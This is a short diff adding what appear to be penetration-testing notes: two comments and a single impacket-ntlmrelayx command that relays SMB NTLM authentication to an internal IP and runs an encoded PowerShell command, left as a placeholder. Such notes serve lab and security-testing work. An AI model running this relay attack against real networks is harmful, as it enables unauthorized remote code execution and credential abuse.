@@ -1,0 +1,4 @@
+#encoded the PowerShell oneliner
+#-t external IP
+
+sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.246.242 -c "powershell -enc powershell one-liner"
